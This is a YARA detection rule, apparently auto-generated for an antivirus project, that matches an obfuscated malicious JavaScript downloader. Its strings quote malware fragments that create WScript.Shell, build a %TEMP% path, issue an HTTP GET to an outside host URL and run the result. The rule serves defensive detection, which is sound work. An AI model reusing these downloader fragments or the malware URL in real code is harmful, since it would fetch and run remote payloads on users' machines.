rule sig_20160427_a0eb185543bce003cce40ee79406549f {
  meta:
    description = "datamaliciousorder - file 20160427_a0eb185543bce003cce40ee79406549f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3955dd43b43d3102df7f1c0b0297f606e9b9014b182d2878e86c141a4ee97dda"

  strings:
    $s1  = "function FwddpZadjd() {return YfsxqCrhlr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"9zZSyW8" ascii
    $s2  = "function FwddpZadjd() {return YfsxqCrhlr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"9zZSyW8" ascii
    $s3  = "var YfsxqCrhlr = function WptjbGjprp() {return TezwwQloxy[YvgnmRsznr](\"WScript\"+\".Shell\");}(), UcfkeVeuqz = 11;" fullword ascii
    $s4  = "function KeaszZfmlr(ZukikAmdyo, ErzowVtvxq){VebwcFapus = VebwcFapus * 1; return ZukikAmdyo - ErzowVtvxq;};" fullword ascii
    $s5  = "BazqwVfhhk[QsgnkXedjh](\"G\" + \"ET\", \"http://adamauto.nl/gdh46ss\", false);" fullword ascii
    $s6  = "var TezwwQloxy = this[\"WScript\"];" fullword ascii
    $s7  = "if (BazqwVfhhk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function UlfxuSaynh(){return RqdwwOfxaj + \"\";};" fullword ascii
    $s9  = "function DohajJnbme() {return ((PlaobJzczi == true) && (PlaobJzczi == OdsnmGiyha)) ? 1 : VebwcFapus;};" fullword ascii
    $s10 = "function VccusFavos(){return 23;};" fullword ascii
    $s11 = "PlaobJzczi = true; " fullword ascii
    $s12 = "OnpxoRfgcp = true;" fullword ascii
    $s13 = "var PlaobJzczi = false;" fullword ascii
    $s14 = "function CvruaVatdy(DqozrEnevf) {var LdrxmCjozq = (1, 2, 3, 4, 5, DqozrEnevf); return LdrxmCjozq;};" fullword ascii
    $s15 = "var ZnubyWavjg = new this[\"D\"+\"ate\"]();" fullword ascii
    $s16 = "var OdsnmGiyha = false;" fullword ascii
    $s17 = "}while (EzssoEojov);" fullword ascii
    $s18 = "var OnpxoRfgcp = false;" fullword ascii
    $s19 = "function UantsPvicp(DdadcJaumj){YfsxqCrhlr[\"R\"+\"un\"](DdadcJaumj, VebwcFapus, VebwcFapus);};" fullword ascii
    $s20 = "OdsnmGiyha = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}